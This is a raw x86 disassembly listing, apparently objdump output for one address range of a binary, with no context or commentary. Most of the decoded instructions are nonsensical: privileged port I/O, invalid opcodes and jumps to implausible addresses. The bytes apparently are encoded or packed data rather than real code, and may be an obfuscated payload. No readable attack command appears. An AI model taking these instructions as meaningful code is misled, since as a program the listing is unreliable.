  40277b:	ef                   	out    %eax,(%dx)
  40277c:	ae                   	scas   %es:(%edi),%al
  40277d:	ed                   	in     (%dx),%eax
  40277e:	f2 27                	repnz daa
  402780:	e2 64                	loop   0x4027e6
  402782:	98                   	cwtl
  402783:	82 e5 25             	and    $0x25,%ch
  402786:	3a 69 de             	cmp    -0x22(%ecx),%ch
  402789:	61                   	popa
  40278a:	de eb                	fsubrp %st,%st(3)
  40278c:	29 64 b9 86          	sub    %esp,-0x7a(%ecx,%edi,4)
  402790:	6f                   	outsl  %ds:(%esi),(%dx)
  402791:	ec                   	in     (%dx),%al
  402792:	7f 90                	jg     0x402724
  402794:	e8 19 cc 63 1d       	call   0x1da3f3b2
  402799:	69 ba 1b 9f 64 4f 61 	imul   $0x3261eb61,0x4f649f1b(%edx),%edi
  4027a0:	eb 61 32 
  4027a3:	e6 28                	out    %al,$0x28
  4027a5:	64 3e e5 4d          	fs ds in $0x4d,%eax
  4027a9:	68 ba 26 68 64       	push   $0x646826ba
  4027ae:	d1 7e e1             	sarl   $1,-0x1f(%esi)
  4027b1:	ac                   	lods   %ds:(%esi),%al
  4027b2:	7b ed                	jnp    0x4027a1
  4027b4:	7d 68                	jge    0x40281e
  4027b6:	ba 26 68 ee 3a       	mov    $0x3aee6826,%edx
  4027bb:	ee                   	out    %al,(%dx)
  4027bc:	6c                   	insb   (%dx),%es:(%edi)
  4027bd:	71 02                	jno    0x4027c1
  4027bf:	ef                   	out    %eax,(%dx)
  4027c0:	29 64 c5 63          	sub    %esp,0x63(%ebp,%eax,8)
  4027c4:	64 e4 7a             	fs in  $0x7a,%al
  4027c7:	66 c9                	leavew
  4027c9:	6c                   	insb   (%dx),%es:(%edi)
  4027ca:	ba 26 68 5d 3f       	mov    $0x3f5d6826,%edx
  4027cf:	6a e8                	push   $0xffffffe8
  4027d1:	24 3a                	and    $0x3a,%al
  4027d3:	14 b3                	adc    $0xb3,%al
  4027d5:	ed                   	in     (%dx),%eax
  4027d6:	ca 91 8e             	lret   $0x8e91
  4027d9:	ed                   	in     (%dx),%eax
  4027da:	7f 92                	jg     0x40276e
  4027dc:	e1 a2                	loope  0x402780
  4027de:	b9 43 64 e4 7a       	mov    $0x7ae46443,%ecx
  4027e3:	66 68 8f 22          	pushw  $0x228f
  4027e7:	ef                   	out    %eax,(%dx)
  4027e8:	a0 25 b1 73 64       	mov    0x6473b125,%al
  4027ed:	e4 7a                	in     $0x7a,%al
  4027ef:	66 e2 64             	data16 loop 0x402856
  4027f2:	b2 62                	mov    $0x62,%dl
  4027f4:	7d f4                	jge    0x4027ea
  4027f6:	a8 24                	test   $0x24,%al
  4027f8:	68 9b 3f 6a e8       	push   $0xe86a3f9b
  4027fd:	24 3a                	and    $0x3a,%al
  4027ff:	c7                   	(bad)
  402800:	4c                   	dec    %esp
  402801:	ea 7b 66 51 61 36 e6 	ljmp   $0xe636,$0x6151667b
  402808:	28 64 48 bd          	sub    %ah,-0x43(%eax,%ecx,2)
  40280c:	97                   	xchg   %eax,%edi
  40280d:	61                   	popa
  40280e:	3a c7                	cmp    %bh,%al
  402810:	2a 64 b3 ae          	sub    -0x52(%ebx,%esi,4),%ah
  402814:	41                   	inc    %ecx
  402815:	bc 99 62 e8 24       	mov    $0x24e86299,%esp
  40281a:	3a 57 a8             	cmp    -0x58(%edi),%dl
  40281d:	24 64                	and    $0x64,%al
  40281f:	3d a1 a7 6c 31       	cmp    $0x316ca7a1,%eax
  402824:	d6                   	salc
  402825:	69 24 a8 5d ed ca 57 	imul   $0x57caed5d,(%eax,%ebp,4),%esp
  40282c:	98                   	cwtl
  40282d:	ed                   	in     (%dx),%eax
  40282e:	fc                   	cld
  40282f:	99                   	cltd
  402830:	6d                   	insl   (%dx),%es:(%edi)
  402831:	64 9b                	fs fwait
  402833:	24 68                	and    $0x68,%al
  402835:	0c af                	or     $0xaf,%al
  402837:	c0 2a 64             	shrb   $0x64,(%edx)
  40283a:	d2 37                	shlb   %cl,(%edi)
  40283c:	3a 64 3a ef          	cmp    -0x11(%edx,%edi,1),%ah
  402840:	af                   	scas   %es:(%edi),%eax
  402841:	0c a5                	or     $0xa5,%al
  402843:	c0 2a 64             	shrb   $0x64,(%edx)
  402846:	6d                   	insl   (%dx),%es:(%edi)
  402847:	8e 34 36             	mov    (%esi,%esi,1),%?
  40284a:	3a 66 cb             	cmp    -0x35(%esi),%ah
  40284d:	28 b5 24 68 0c 8e    	sub    %dh,-0x71f397dc(%ebp)
  402853:	c0 2a 64             	shrb   $0x64,(%edx)
  402856:	6d                   	insl   (%dx),%es:(%edi)
  402857:	8e 24 36             	mov    (%esi,%esi,1),%fs
  40285a:	3a 66 cb             	cmp    -0x35(%esi),%ah
  40285d:	60                   	pusha
  40285e:	b4 27                	mov    $0x27,%ah
  402860:	68 e5 d4 eb 3a       	push   $0x3aebd4e5
  402865:	64 3a 0e             	cmp    %fs:(%esi),%cl
  402868:	a1 c2 78 66 3f       	mov    0x3f6678c2,%eax
  40286d:	8c 0c 34             	mov    %cs,(%esp,%esi,1)
  402870:	68 64 99 92 e5       	push   $0xe5929964
  402875:	25 3a 0e bf c2       	and    $0xc2bf0e3a,%eax
  40287a:	78 66                	js     0x4028e2
  40287c:	3f                   	aas
  40287d:	8c 1c 34             	mov    %ds,(%esp,%esi,1)
  402880:	68 64 99 7a e6       	push   $0xe67a9964
  402885:	25 3a 0e 82 c2       	and    $0xc2820e3a,%eax
  40288a:	78 66                	js     0x4028f2
  40288c:	3f                   	aas
  40288d:	8c 2c 34             	mov    %gs,(%esp,%esi,1)
  402890:	68 64 99 2e e7       	push   $0xe72e9964
  402895:	26 3a 39             	cmp    %es:(%ecx),%bh
  402898:	36 a7                	cmpsl  %es:(%edi),%ss:(%esi)
  40289a:	6f                   	outsl  %ds:(%esi),(%dx)
  40289b:	ef                   	out    %eax,(%dx)
  40289c:	8d                   	lea    (bad),%esp
  40289d:	e7 d6                	out    %eax,$0xd6
  40289f:	0e                   	push   %cs
  4028a0:	3b 32                	cmp    (%edx),%esi
  4028a2:	6d                   	insl   (%dx),%es:(%edi)
  4028a3:	dd 84 11 c7 5e e1 bc 	fldl   -0x431ea139(%ecx,%edx,1)
  4028aa:	cd 85                	int    $0x85
  4028ac:	e1 21                	loope  0x4028cf
  4028ae:	a2 ef ab 9b 3f       	mov    %al,0x3f9babef
  4028b3:	66 c9                	leavew
  4028b5:	26 3a 0e             	cmp    %es:(%esi),%cl
  4028b8:	78 c3                	js     0x40287d
  4028ba:	78 66                	js     0x402922
  4028bc:	e5 21                	in     $0x21,%eax
  4028be:	92                   	xchg   %eax,%edx
  4028bf:	36 97                	ss xchg %eax,%edi
  4028c1:	71 76                	jno    0x402939
  4028c3:	e9 2a 64 fd 23       	jmp    0x243d8cf2
  4028c8:	80 7c 3a 66 68       	cmpb   $0x68,0x66(%edx,%edi,1)
  4028cd:	ed                   	in     (%dx),%eax
  4028ce:	e2 4f                	loop   0x40291f
  4028d0:	b0 ed                	mov    $0xed,%al
  4028d2:	f9                   	stc
  4028d3:	e5 0d                	in     $0xd,%eax
  4028d5:	88 3a                	mov    %bh,(%edx)
  4028d7:	eb 2d                	jmp    0x402906
  4028d9:	cc                   	int3
  4028da:	b3 23                	mov    $0x23,%bl
  4028dc:	98                   	cwtl
  4028dd:	a3 7f 92 28 64       	mov    %eax,0x6428927f
  4028e2:	3a 66 e9             	cmp    -0x17(%esi),%ah
  4028e5:	97                   	xchg   %eax,%edi
  4028e6:	77 23                	ja     0x40290b
  4028e8:	68 64 b9 03 90       	push   $0x9003b964
  4028ed:	64 b9 03 94 64 c5    	fs mov $0xc5649403,%ecx
  4028f3:	63 68 c5             	arpl   %ebp,-0x3b(%eax)
  4028f6:	78 66                	js     0x40295e
  4028f8:	eb 01                	jmp    0x4028fb
  4028fa:	ea 66 e1 bc 3b be e1 	ljmp   $0xe1be,$0x3bbce166
  402901:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402902:	b9 03 bc 64 fd       	mov    $0xfd64bc03,%ecx
  402907:	23 b0 65 3a 66 68    	and    0x68663a65(%eax),%esi
  40290d:	a3 7f ba 69 64       	mov    %eax,0x6469ba7f
  402912:	3a 66 e5             	cmp    -0x1b(%esi),%ah
  402915:	61                   	popa
  402916:	3a c1                	cmp    %cl,%al
  402918:	2a 64 b3 23          	sub    0x23(%ebx,%esi,4),%ah
  40291c:	88 9b 3f 66 c9 26    	mov    %bl,0x26c9663f(%ebx)
  402922:	3a a1 2d d4 38 66    	cmp    0x6638d42d(%ecx),%ah
  402928:	68 64 bb 95 6f       	push   $0x6f95bb64
  40292d:	0b 3a                	or     (%edx),%edi
  40292f:	66 af                	scas   %es:(%edi),%ax
  402931:	21 8e 67 68 64 3a    	and    %ecx,0x3a646867(%esi)
  402937:	e5 0d                	in     $0xd,%eax
  402939:	dc 3a                	fdivrl (%edx)
  40293b:	eb 15                	jmp    0x402952
  40293d:	d8 b7 13 b8 dd 3f    	fdivs  0x3fddb813(%edi)
  402943:	66 68 64 c9          	pushw  $0xc964
  402947:	c3                   	ret
  402948:	e5 21                	in     $0x21,%eax
  40294a:	d2 36                	shlb   %cl,(%esi)
  40294c:	00 64 3a 60          	add    %ah,0x60(%edx,%edi,1)
  402950:	68 e9 7f 82 38       	push   $0x38827fe9
  402955:	9b                   	fwait
  402956:	2f                   	das
  402957:	92                   	xchg   %eax,%edx
  402958:	e5 25                	in     $0x25,%eax
  40295a:	3a ef                	cmp    %bh,%ch
  40295c:	b0 65                	mov    $0x65,%al
  40295e:	e2 ef                	loop   0x40294f
  402960:	ab                   	stos   %eax,%es:(%edi)
  402961:	e9 7f fa 38 0e       	jmp    0xe7923e5
  402966:	3a eb                	cmp    %bl,%ch
  402968:	2d c0 6a 0c 68       	sub    $0x680c6ac0,%eax
  40296d:	0e                   	push   %cs
  40296e:	3a 0c 6c             	cmp    (%esp,%ebp,2),%cl
  402971:	0e                   	push   %cs
  402972:	3c 99                	cmp    $0x99,%al
  402974:	1d 80 d2 e7 3c       	sbb    $0x3ce7d280,%eax
  402979:	64 3a eb             	fs cmp %bl,%ch
  40297c:	2d c4 6a 99 1d       	sub    $0x1d996ac4,%eax
  402981:	c0 b7 23 d8 34 50 67 	shlb   $0x67,0x5034d823(%edi)
  402988:	80 e3 6e             	and    $0x6e,%bl
  40298b:	66 68 9b 3f          	pushw  $0x3f9b
  40298f:	66 c9                	leavew
  402991:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  402995:	9b                   	fwait
  402996:	4f                   	dec    %edi
  402997:	c6 02 64             	movb   $0x64,(%edx)
  40299a:	50                   	push   %eax
  40299b:	66 02 60 50          	data16 add 0x50(%eax),%ah
  40299f:	60                   	pusha
  4029a0:	97                   	xchg   %eax,%edi
  4029a1:	11 de                	adc    %ebx,%esi
  4029a3:	8e 08                	mov    (%eax),%cs
  4029a5:	30 3a                	xor    %bh,(%edx)
  4029a7:	66 e9 8f d7          	jmpw   0x13a
  4029ab:	5e                   	pop    %esi
  4029ac:	68 64 c5 13 8c       	push   $0x8c13c564
  4029b1:	8c dc                	mov    %ds,%esp
  4029b3:	36 68 64 c5 63 68    	ss push $0x6863c564
  4029b9:	c5 78 66             	lds    0x66(%eax),%edi
  4029bc:	e5 21                	in     $0x21,%eax
  4029be:	d2 36                	shlb   %cl,(%esi)
  4029c0:	97                   	xchg   %eax,%edi
  4029c1:	11 8a eb 2d 80 6a    	adc    %ecx,0x6a802deb(%edx)
  4029c7:	99                   	cltd
  4029c8:	7d 90                	jge    0x40295a
  4029ca:	b7 27                	mov    $0x27,%bh
  4029cc:	68 ef 7f 82 83       	push   $0x83827fef
  4029d1:	62 bb a5 6f 47 3a    	bound  %edi,0x3a476fa5(%ebx)
  4029d7:	66 37                	data16 aaa
  4029d9:	3a 61 af             	cmp    -0x51(%ecx),%ah
  4029dc:	ab                   	stos   %eax,%es:(%edi)
  4029dd:	31 b3 83 eb 88 12    	xor    %esi,0x1288eb83(%ebx)
  4029e3:	a1 2d 98 f6 2f       	mov    0x2ff6982d,%eax
  4029e8:	aa                   	stos   %al,%es:(%edi)
  4029e9:	32 82 c7 38 64 3a    	xor    0x3a6438c7(%edx),%al
  4029ef:	91                   	xchg   %eax,%ecx
  4029f0:	0d 98 b3 23 8c       	or     $0x8c23b398,%eax
  4029f5:	ed                   	in     (%dx),%eax
  4029f6:	7f 9a                	jg     0x402992
  4029f8:	e3 21                	jecxz  0x402a1b
  4029fa:	36 ef                	ss out %eax,(%dx)
  4029fc:	2d 94 b1 2b 78       	sub    $0x782bb194,%eax
  402a01:	ed                   	in     (%dx),%eax
  402a02:	77 9e                	ja     0x4029a2
  402a04:	eb 01                	jmp    0x402a07
  402a06:	ce                   	into
  402a07:	66 59                	pop    %cx
  402a09:	b6 b3                	mov    $0xb3,%dh
  402a0b:	33 84 ed 7f 8e 02 60 	xor    0x60028e7f(%ebp,%ebp,8),%eax
  402a12:	50                   	push   %eax
  402a13:	66 02 65 b7          	data16 add -0x49(%ebp),%ah
  402a17:	23 90 34 b7 23 80    	and    -0x7fdc48cc(%eax),%edx
  402a1d:	34 c5                	xor    $0xc5,%al
  402a1f:	13 90 0e 3a eb 2d    	adc    0x2deb3a0e(%eax),%edx
  402a25:	90                   	nop
  402a26:	6a 0c                	push   $0xc
  402a28:	97                   	xchg   %eax,%edi
  402a29:	9b                   	fwait
  402a2a:	4f                   	dec    %edi
  402a2b:	6e                   	outsb  %ds:(%esi),(%dx)
  402a2c:	97                   	xchg   %eax,%edi
  402a2d:	71 26                	jno    0x402a55
  402a2f:	e8 29 64 b1 23       	call   0x23f18e5d
  402a34:	9c                   	pushf
  402a35:	8f 28 ed 2d          	(bad)
  402a39:	98                   	cwtl
  402a3a:	b3 23                	mov    $0x23,%bl
  402a3c:	88 ed                	mov    %ch,%ch
  402a3e:	7f ba                	jg     0x4029fa
  402a40:	9f                   	lahf
  402a41:	01 da                	add    %ebx,%edx
  402a43:	ef                   	out    %eax,(%dx)
  402a44:	2d bc b3 23 94       	sub    $0x9423b3bc,%eax
  402a49:	ad                   	lods   %ds:(%esi),%eax
  402a4a:	f9                   	stc
  402a4b:	33 e1                	xor    %ecx,%esp
  402a4d:	81 6b 31 d7 c8 2f 36 	subl   $0x362fc8d7,0x31(%ebx)
  402a54:	0c ed                	or     $0xed,%al
  402a56:	c2 91 8f             	ret    $0x8f91
  402a59:	ed                   	in     (%dx),%eax
  402a5a:	7f 9a                	jg     0x4029f6
  402a5c:	e1 a3                	loope  0x402a01
  402a5e:	c5 63 68             	lds    0x68(%ebx),%esp
  402a61:	c5 78 66             	lds    0x66(%eax),%edi
  402a64:	97                   	xchg   %eax,%edi
  402a65:	11 32                	adc    %esi,(%edx)
  402a67:	0c 97                	or     $0x97,%al
  402a69:	9b                   	fwait
  402a6a:	2f                   	das
  402a6b:	62 e6 25 3a 39       	(bad)
  402a70:	a1 a7 6f ef 8d       	mov    0x8def6fa7,%eax
  402a75:	e7 d6                	out    %eax,$0xd6
  402a77:	6a 3b                	push   $0x3b
  402a79:	32 6d ed             	xor    -0x13(%ebp),%ch
  402a7c:	1d 6c b1 3b 64       	sbb    $0x643bb16c,%eax
  402a81:	9b                   	fwait
  402a82:	3f                   	aas
  402a83:	66 c9                	leavew
  402a85:	26 3a 57 97          	cmp    %es:-0x69(%edi),%dl
  402a89:	6b 8c 62 56 59 c5 66 	imul   $0x68,0x66c55956(%edx,%eiz,2),%ecx
  402a90:	68 
  402a91:	64 4f                	fs dec %edi
  402a93:	52                   	push   %edx
  402a94:	67 d2 7e 51          	sarb   %cl,0x51(%bp)
  402a98:	69 59 c5 66 68 64 4f 	imul   $0x4f646866,-0x3b(%ecx),%ebx
  402a9f:	4e                   	dec    %esi
  402aa0:	67 d2 7e 51          	sarb   %cl,0x51(%bp)
  402aa4:	6a 59                	push   $0x59
  402aa6:	c5 66 68             	lds    0x68(%esi),%esp
  402aa9:	64 4f                	fs dec %edi
  402aab:	7a 67                	jp     0x402b14
  402aad:	d2 7e 51             	sarb   %cl,0x51(%esi)
  402ab0:	6b 59 c5 66          	imul   $0x66,-0x3b(%ecx),%ebx
  402ab4:	68 64 4f 76 67       	push   $0x67764f64
  402ab9:	d2 7e 51             	sarb   %cl,0x51(%esi)
  402abc:	6c                   	insb   (%dx),%es:(%edi)
  402abd:	59                   	pop    %ecx
  402abe:	c5 66 68             	lds    0x68(%esi),%esp
  402ac1:	64 35 e2 62 66 3a    	fs xor $0x3a6662e2,%eax
  402ac7:	66 e3 21             	data16 jecxz 0x402aeb
  402aca:	2a eb                	sub    %bl,%ch
  402acc:	2c 67                	sub    $0x67,%al
  402ace:	3f                   	aas
  402acf:	ec                   	in     (%dx),%al
  402ad0:	7c 5a                	jl     0x402b2c
  402ad2:	b2 72                	mov    $0x72,%dl
  402ad4:	50                   	push   %eax
  402ad5:	a2 7f 99 68 6b       	mov    %al,0x6b68997f
  402ada:	8c 23                	mov    %fs,(%ebx)
  402adc:	97                   	xchg   %eax,%edi
  402add:	6b 8c 62 6d 8a 92 24 	imul   $0x68,0x24928a6d(%edx,%eiz,2),%ecx
  402ae4:	68 
  402ae5:	6b 8c 72 56 5d f8 69 	imul   $0xffffffed,0x69f85d56(%edx,%esi,2),%ecx
  402aec:	ed 
  402aed:	f3 3a 66 68          	repz cmp 0x68(%esi),%ah
  402af1:	ed                   	in     (%dx),%eax
  402af2:	c0 2c 67 d2          	shrb   $0xd2,(%edi,%eiz,2)
  402af6:	2e 70 51             	jo,pn  0x402b4a
  402af9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402afa:	35 e3 e0 64 3a       	xor    $0x3a64e0e3,%eax
  402aff:	66 e1 9e             	data16 loope 0x402aa0
  402b02:	b9 8c 6a 6b 8c       	mov    $0x8c6b6a8c,%ecx
  402b07:	72 7e                	jb     0x402b87
  402b09:	5d                   	pop    %ebp
  402b0a:	f8                   	clc
  402b0b:	13 13                	adc    (%ebx),%edx
  402b0d:	ed                   	in     (%dx),%eax
  402b0e:	c0 e5 82             	shl    $0x82,%ch
  402b11:	67 35 d0 7c 72 03    	addr16 xor $0x3727cd0,%eax
  402b17:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402b18:	1d 0a b3 9e eb       	sbb    $0xeb9eb30a,%eax
  402b1d:	8c 3e                	mov    %?,(%esi)
  402b1f:	69 de 60 3c 5b 80    	imul   $0x805b3c60,%esi,%ebx
  402b25:	64 3a 66 1d          	cmp    %fs:0x1d(%esi),%ah
  402b29:	3a 35 d0 2d 9b 51    	cmp    0x519b2dd0,%dh
  402b2f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402b30:	67 e9 3e 63 9d cc    	addr16 jmp 0xccdd8e74
  402b36:	78 66                	js     0x402b9e
  402b38:	38 8c 68 29 68 64 35 	cmp    %cl,0x35646829(%eax,%ebp,2)
  402b3f:	d0 3d 9b 51 b4 7c    	sarb   $1,0x7cb4519b
  402b45:	e9 2e 73 36 cd       	jmp    0xcd769e78
  402b4a:	78 66                	js     0x402bb2
  402b4c:	3a 34 d2             	cmp    (%edx,%edx,8),%dh
  402b4f:	33 27                	xor    (%edi),%esp
  402b51:	64 3a ef             	fs cmp %bh,%ch
  402b54:	2d 9c b9 ae 97       	sub    $0x97aeb99c,%eax
  402b59:	ef                   	out    %eax,(%dx)
  402b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b5b:	76 e5                	jbe    0x402b42
  402b5d:	30 29                	xor    %ch,(%ecx)
  402b5f:	63 69 9e             	arpl   %ebp,-0x62(%ecx)
  402b62:	b9 8c 6c 4d ea       	mov    $0xea4d6c8c,%ecx
  402b67:	65 2d 9c b9 8e 6c    	gs sub $0x6c8eb99c,%eax
  402b6d:	ed                   	in     (%dx),%eax
  402b6e:	7f 92                	jg     0x402b02
  402b70:	e3 21                	jecxz  0x402b93
  402b72:	2a eb                	sub    %bl,%ch
  402b74:	2c 67                	sub    $0x67,%al
  402b76:	3f                   	aas
  402b77:	67 90                	addr16 nop
  402b79:	e7 d2                	out    %eax,$0xd2
  402b7b:	62 e3 31             	(bad) {%k6}{z}
  402b7e:	ce                   	into
  402b7f:	ef                   	out    %eax,(%dx)
  402b80:	7c 61                	jl     0x402be3
  402b82:	3b 66 68             	cmp    0x68(%esi),%esp
  402b85:	64 d1 46 67          	roll   $1,%fs:0x67(%esi)
  402b89:	d2 7f 99             	sarb   %cl,-0x67(%edi)
  402b8c:	03 a4 2e e6 54 61 64 	add    0x646154e6(%esi,%ebp,1),%esp
  402b93:	cf                   	iret
  402b94:	2a 64 3a 12          	sub    0x12(%edx,%edi,1),%ah
  402b98:	67 e4 7f             	addr16 in $0x7f,%al
  402b9b:	99                   	cltd
  402b9c:	69 8d 0d 99 97 9b c5 	imul   $0xc56863c5,-0x646866f3(%ebp),%ecx
  402ba3:	63 68 c5 
  402ba6:	78 66                	js     0x402c0e
  402ba8:	e8 58 04 62 1d       	call   0x1da23005
  402bad:	30 b3 9e 20 e4 06    	xor    %dh,0x6e4209e(%ebx)
  402bb3:	60                   	pusha
  402bb4:	6c                   	insb   (%dx),%es:(%edi)
  402bb5:	11 71 ef             	adc    %esi,-0x11(%ecx)
  402bb8:	90                   	nop
  402bb9:	e7 d2                	out    %eax,$0xd2
  402bbb:	64 e8 58 3c 62 1d    	fs call 0x1da26819
  402bc1:	24 b3                	and    $0xb3,%al
  402bc3:	9e                   	sahf
  402bc4:	eb 8c                	jmp    0x402b52
  402bc6:	39 e6                	cmp    %esp,%esi
  402bc8:	54                   	push   %esp
  402bc9:	62 3e                	bound  %edi,(%esi)
  402bcb:	13 5d ed             	adc    -0x13(%ebp),%ebx
  402bce:	c2 e5 80             	ret    $0x80e5
  402bd1:	60                   	pusha
  402bd2:	35 d0 6c 62 06       	xor    $0x6626cd0,%eax
  402bd7:	0e                   	push   %cs
  402bd8:	1c 76                	sbb    $0x76,%al
  402bda:	07                   	pop    %es
  402bdb:	d8 68 64             	fsubrs 0x64(%eax)
  402bde:	3a 12                	cmp    (%edx),%dl
  402be0:	63 ed                	arpl   %ebp,%ebp
  402be2:	c2 e5 80             	ret    $0x80e5
  402be5:	61                   	popa
  402be6:	ba 5a 6e 40 4f       	mov    $0x4f406e5a,%edx
  402beb:	70 e1                	jo     0x402bce
  402bed:	bc 39 23 78 e9       	mov    $0xe9782339,%esp
  402bf2:	6e                   	outsb  %ds:(%esi),(%dx)
  402bf3:	5e                   	pop    %esi
  402bf4:	6d                   	insl   (%dx),%es:(%edi)
  402bf5:	e7 d0                	out    %eax,$0xd0
  402bf7:	62 eb a4             	(bad) {rd-bad},{%k5}
  402bfa:	3d ef 6c 71 3b       	cmp    $0x3b716cef,%eax
  402bff:	66 68 64 ba          	pushw  $0xba64
  402c03:	5a                   	pop    %edx
  402c04:	56                   	push   %esi
  402c05:	66 4f                	dec    %di
  402c07:	03 e1                	add    %ecx,%esp
  402c09:	9c                   	pushf
  402c0a:	72 e6                	jb     0x402bf2
  402c0c:	54                   	push   %esp
  402c0d:	62 38                	bound  %edi,(%eax)
  402c0f:	13 34 ed c2 e5 80 66 	adc    0x6680e5c2(,%ebp,8),%esi
  402c16:	ba 5a 6e 66 4f       	mov    $0x4f666e5a,%edx
  402c1b:	37                   	aaa
  402c1c:	e1 9c                	loope  0x402bba
  402c1e:	b9 8e 6b e4 06       	mov    $0x6e46b8e,%ecx
  402c23:	60                   	pusha
  402c24:	6a 11                	push   $0x11
  402c26:	7c ef                	jl     0x402c17
  402c28:	90                   	nop
  402c29:	e7 d2                	out    %eax,$0xd2
  402c2b:	62 67 d2             	bound  %esp,-0x2e(%edi)
  402c2e:	3e 60                	ds pusha
  402c30:	55                   	push   %ebp
  402c31:	8c 3a                	mov    %?,(%edx)
  402c33:	66 68 10 3d          	pushw  $0x3d10
  402c37:	5b                   	pop    %ebx
  402c38:	81 64 3a 66 1d 4b b9 	andl   $0xaeb94b1d,0x66(%edx,%edi,1)
  402c3f:	ae 
  402c40:	97                   	xchg   %eax,%edi
  402c41:	ef                   	out    %eax,(%dx)
  402c42:	6f                   	outsl  %ds:(%esi),(%dx)
  402c43:	76 e5                	jbe    0x402c2a
  402c45:	30 29                	xor    %ch,(%ecx)
  402c47:	63 69 9e             	arpl   %ebp,-0x62(%ecx)
  402c4a:	b9 8c 6c 4d ea       	mov    $0xea4d6c8c,%ecx
  402c4f:	67 b0 e7             	addr16 mov $0xe7,%al
  402c52:	d2 62 e1             	shlb   %cl,-0x1f(%edx)
  402c55:	21 c2                	and    %eax,%edx
  402c57:	ed                   	in     (%dx),%eax
  402c58:	2d 74 b7 22 6b       	sub    $0x6b22b774,%eax
  402c5d:	61                   	popa
  402c5e:	3b 9e eb 8c 3e ed    	cmp    -0x12c17315(%esi),%ebx
  402c64:	3d 9c b3 72 6d       	cmp    $0x6d72b39c,%eax
  402c69:	65 3a 66 68          	cmp    %gs:0x68(%esi),%ah
  402c6d:	e4 06                	in     $0x6,%al
  402c6f:	58                   	pop    %eax
  402c70:	69 11 68 ef 90 2c    	imul   $0x2c90ef68,(%ecx),%edx
  402c76:	ba 5a 6e 65 4f       	mov    $0x4f656e5a,%edx
  402c7b:	2f                   	das
  402c7c:	e1 9c                	loope  0x402c1a
  402c7e:	b9 8e 6a e4 06       	mov    $0x6e46a8e,%ecx
  402c83:	60                   	pusha
  402c84:	69 11 04 ef 90 e7    	imul   $0xe790ef04,(%ecx),%edx
  402c8a:	d2 65 e8             	shlb   %cl,-0x18(%ebp)
  402c8d:	58                   	pop    %eax
  402c8e:	3c 67                	cmp    $0x67,%al
  402c90:	1d 57 b3 9e eb       	sbb    $0xeb9eb357,%eax
  402c95:	8c 3e                	mov    %?,(%esi)
  402c97:	69 de 60 3c 5a 55    	imul   $0x555a3c60,%esi,%ebx
  402c9d:	10 34 5b             	adc    %dh,(%ebx,%ebx,2)
  402ca0:	96                   	xchg   %eax,%esi
  402ca1:	64 3a 66 1c          	cmp    %fs:0x1c(%esi),%ah
  402ca5:	63 07                	arpl   %eax,(%edi)
  402ca7:	99                   	cltd
  402ca8:	68 64 3a 13 70       	push   $0x70133a64
  402cad:	8c 98 2b 68 64 b1    	mov    %ds,-0x4e9b97d5(%eax)
  402cb3:	33 78 e9             	xor    -0x17(%eax),%edi
  402cb6:	6e                   	outsb  %ds:(%esi),(%dx)
  402cb7:	75 6d                	jne    0x402d26
  402cb9:	65 c0 e5 82          	gs shl $0x82,%ch
  402cbd:	60                   	pusha
  402cbe:	b3 62                	mov    $0x62,%bl
  402cc0:	7d 65                	jge    0x402d27
  402cc2:	3a 66 68             	cmp    0x68(%esi),%ah
  402cc5:	23 bb 99 68 60 3a    	and    0x3a606899(%ebx),%edi
  402ccb:	66 67 e6 8d          	data16 addr16 out %al,$0x8d
  402ccf:	9b                   	fwait
  402cd0:	97                   	xchg   %eax,%edi
  402cd1:	9b                   	fwait
  402cd2:	65 38 33             	cmp    %dh,%gs:(%ebx)
  402cd5:	ad                   	lods   %ds:(%esi),%eax
  402cd6:	f9                   	stc
  402cd7:	33 e1                	xor    %ecx,%esp
  402cd9:	81 b9 8a 64 37 6c 31 	cmpl   $0x3a619731,0x6c37648a(%ecx)
  402ce0:	97 61 3a 
  402ce3:	c7                   	(bad)
  402ce4:	2a 64 b1 13          	sub    0x13(%ecx,%esi,4),%ah
  402ce8:	60                   	pusha
  402ce9:	8f                   	(bad)
  402cea:	26 57                	es push %edi
  402cec:	97                   	xchg   %eax,%edi
  402ced:	8f                   	(bad)
  402cee:	3d e6 54 5a 3a       	cmp    $0x3a5a54e6,%eax
  402cf3:	13 61 23             	adc    0x23(%ecx),%esp
  402cf6:	bb 99 80 67 3a       	mov    $0x3a678099,%ebx
  402cfb:	66 1e                	pushw  %ds
  402cfd:	95                   	xchg   %eax,%ebp
  402cfe:	bb 99 80 67 3a       	mov    $0x3a678099,%ebx
  402d03:	66 1b 76 7c          	sbb    0x7c(%esi),%si
  402d07:	ed                   	in     (%dx),%eax
  402d08:	2d 68 17 8e 6b       	sub    $0x6b8e1768,%eax
  402d0d:	64 3a 5f ae          	cmp    %fs:-0x52(%edi),%bl
  402d11:	12 e2                	adc    %dl,%ah
  402d13:	8f 81 64 3a 66 eb    	pop    -0x1499c59c(%ecx)
  402d19:	a2 30 99 6d 64       	mov    %al,0x646d9930
  402d1e:	9b                   	fwait
  402d1f:	24 68                	and    $0x68,%al
  402d21:	6b 8c 33 78 a5 d8 64 	imul   $0xffffffe3,0x64d8a578(%ebx,%esi,1),%ecx
  402d28:	e3 
  402d29:	58                   	pop    %eax
  402d2a:	2f                   	das
  402d2b:	46                   	inc    %esi
  402d2c:	e9 24 3a 57 b3       	jmp    0xb3976755
  402d31:	ed                   	in     (%dx),%eax
  402d32:	c2 67 b0             	ret    $0xb067
  402d35:	34 d2                	xor    $0xd2,%al
  402d37:	c7                   	(bad)
  402d38:	9e                   	sahf
  402d39:	9b                   	fwait
  402d3a:	c5 3f                	lds    (%edi),%edi
  402d3c:	97                   	xchg   %eax,%edi
  402d3d:	61                   	popa
  402d3e:	3a c7                	cmp    %bh,%al
  402d40:	2a 64 35 d0          	sub    -0x30(%ebp,%esi,1),%ah
  402d44:	6c                   	insb   (%dx),%es:(%edi)
  402d45:	7b 07                	jnp    0x402d4e
  402d47:	8e 68 64             	mov    0x64(%eax),%gs
  402d4a:	3a 12                	cmp    (%edx),%dl
  402d4c:	4f                   	dec    %edi
  402d4d:	59                   	pop    %ecx
  402d4e:	d3 66 68             	shll   %cl,0x68(%esi)
  402d51:	64 4e                	fs dec %esi
  402d53:	46                   	inc    %esi
  402d54:	eb 01                	jmp    0x402d57
  402d56:	c6                   	(bad)
